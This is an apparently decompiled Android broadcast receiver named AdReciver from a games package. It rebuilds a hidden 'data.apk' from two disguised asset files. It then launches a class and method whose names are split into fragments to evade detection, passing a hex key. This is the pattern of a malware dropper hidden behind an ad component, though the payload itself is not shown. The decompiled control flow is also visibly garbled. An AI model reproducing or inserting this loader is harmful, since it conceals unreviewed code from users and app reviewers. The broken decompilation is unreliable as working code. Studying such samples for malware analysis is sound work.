public class com.games.AdReciver extends android.content.BroadcastReceiver {
	 /* # direct methods */
	 public com.games.AdReciver ( ) {
		 /* .locals 0 */
		 /* invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V */
		 return;
	 } // .end method
	 /* # virtual methods */
	 public void a ( android.content.Context p0 ) {
		 /* .locals 8 */
		 /* const v7, 0x1fce2 */
		 /* const v6, 0x1fbd0 */
		 int v0 = 0; // const/4 v0, 0x0
		 try { // :try_start_0
			 (( android.content.Context ) p1 ).getAssets ( ); // invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
			 final String v2 = "ccn.ac"; // const-string v2, "ccn.ac"
			 (( android.content.res.AssetManager ) v1 ).open ( v2 ); // invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
			 /* const v2, 0x1fbd0 */
			 /* new-array v2, v2, [B */
			 (( java.io.InputStream ) v1 ).read ( v2 ); // invoke-virtual {v1, v2}, Ljava/io/InputStream;->read([B)I
			 (( android.content.Context ) p1 ).getAssets ( ); // invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
			 final String v3 = "nnx.bc"; // const-string v3, "nnx.bc"
			 (( android.content.res.AssetManager ) v1 ).open ( v3 ); // invoke-virtual {v1, v3}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
			 /* const v3, 0x1fce2 */
			 /* new-array v3, v3, [B */
			 (( java.io.InputStream ) v1 ).read ( v3 ); // invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I
			 /* const v1, 0x3f8b2 */
			 /* new-array v4, v1, [B */
			 /* move v1, v0 */
		 } // :goto_0
		 /* if-lt v1, v6, :cond_0 */
	 } // :goto_1
	 /* if-lt v0, v7, :cond_1 */
	 final String v0 = "dat"; // const-string v0, "dat"
	 final String v1 = "a.a"; // const-string v1, "a.a"
	 final String v2 = "pk"; // const-string v2, "pk"
	 /* new-instance v3, Ljava/lang/StringBuilder; */
	 java.lang.String .valueOf ( v0 );
	 /* invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
	 (( java.lang.StringBuilder ) v3 ).append ( v1 ); // invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
	 (( java.lang.StringBuilder ) v0 ).append ( v2 ); // invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
	 (( java.lang.StringBuilder ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
	 int v1 = 0; // const/4 v1, 0x0
	 (( android.content.Context ) p1 ).openFileOutput ( v0, v1 ); // invoke-virtual {p1, v0, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
	 (( java.io.OutputStream ) v0 ).write ( v4 ); // invoke-virtual {v0, v4}, Ljava/io/OutputStream;->write([B)V
	 (( java.io.OutputStream ) v0 ).flush ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V
	 (( java.io.OutputStream ) v0 ).close ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
} // :goto_2
return;
} // :cond_0
/* aget-byte v5, v2, v1 */
/* aput-byte v5, v4, v1 */
/* add-int/lit8 v1, v1, 0x1 */
} // :cond_1
/* add-int v1, v6, v0 */
/* aget-byte v2, v3, v0 */
/* aput-byte v2, v4, v1 */
/* :try_end_0 */
/* .catch Ljava/io/IOException; {:try_start_0 ..:try_end_0} :catch_0 */
/* add-int/lit8 v0, v0, 0x1 */
/* :catch_0 */
/* move-exception v0 */
(( java.io.IOException ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
} // .end method
public void onReceive ( android.content.Context p0, android.content.Intent p1 ) {
/* .locals 16 */
final String v1 = "com."; // const-string v1, "com."
final String v2 = "game."; // const-string v2, "game."
final String v3 = "param"; // const-string v3, "param"
/* new-instance v4, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v1 );
/* invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v4 ).append ( v2 ); // invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).append ( v3 ); // invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
int v2 = 0; // const/4 v2, 0x0
/* move-object/from16 v0, p1 */
(( android.content.Context ) v0 ).getSharedPreferences ( v1, v2 ); // invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
final String v1 = "sn"; // const-string v1, "sn"
v1 = int v2 = 0; // const/4 v2, 0x0
/* add-int/lit8 v1, v1, 0x1 */
v2 = java.lang.System.out;
/* new-instance v3, Ljava/lang/StringBuilder; */
final String v4 = "sn: "; // const-string v4, "sn: "
/* invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v3 ).append ( v1 ); // invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v3 ).toString ( ); // invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
(( java.io.PrintStream ) v2 ).println ( v3 ); // invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
int v2 = 2; // const/4 v2, 0x2
/* if-ge v1, v2, :cond_1 */
/* invoke-virtual/range {p0 ..p1}, Lcom/games/AdReciver;->a(Landroid/content/Context;)V */
final String v3 = "sn"; // const-string v3, "sn"
} // :cond_0
} // :goto_0
return;
} // :cond_1
/* new-instance v1, Lcom/games/b; */
/* move-object/from16 v0, p1 */
/* invoke-direct {v1, v0}, Lcom/games/b;-><init>(Landroid/content/Context;)V */
final String v4 = "com."; // const-string v4, "com."
final String v5 = "ccx."; // const-string v5, "ccx."
final String v6 = "xm."; // const-string v6, "xm."
final String v8 = "SDKS"; // const-string v8, "SDKS"
final String v9 = "tart"; // const-string v9, "tart"
final String v2 = "/fi"; // const-string v2, "/fi"
final String v3 = "les/d"; // const-string v3, "les/d"
final String v10 = "ata.a"; // const-string v10, "ata.a"
final String v11 = "pk"; // const-string v11, "pk"
final String v12 = "InitS"; // const-string v12, "InitS"
final String v13 = "tart"; // const-string v13, "tart"
v1 = this.h;
final String v14 = ""; // const-string v14, ""
v1 = (( java.lang.String ) v1 ).equals ( v14 ); // invoke-virtual {v1, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
/* if-nez v1, :cond_0 */
/* invoke-virtual/range {p1 ..p1}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo; */
v1 = this.dataDir;
/* new-instance v14, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v1 );
/* invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v14 ).append ( v2 ); // invoke-virtual {v14, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v2 ).append ( v3 ); // invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v2 ).append ( v10 ); // invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v2 ).append ( v11 ); // invoke-virtual {v2, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v2 ).toString ( ); // invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v3, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v1 );
/* invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v1 = "/files"; // const-string v1, "/files"
(( java.lang.StringBuilder ) v3 ).append ( v1 ); // invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v1, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v4 );
/* invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v1 ).append ( v5 ); // invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).append ( v6 ); // invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).append ( v8 ); // invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).append ( v9 ); // invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v1, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v12 );
/* invoke-direct {v1, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v1 ).append ( v13 ); // invoke-virtual {v1, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
final String v6 = "1dae2ef6c01a15fd5ddfe6c68480b990"; // const-string v6, "1dae2ef6c01a15fd5ddfe6c68480b990"
/* move-object/from16 v1, p1 */
/* invoke-static/range {v1 ..v6}, Lcom/games/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V */
final String v2 = "sn"; // const-string v2, "sn"
int v3 = 0; // const/4 v3, 0x0
/* goto/16 :goto_0 */
} // .end method
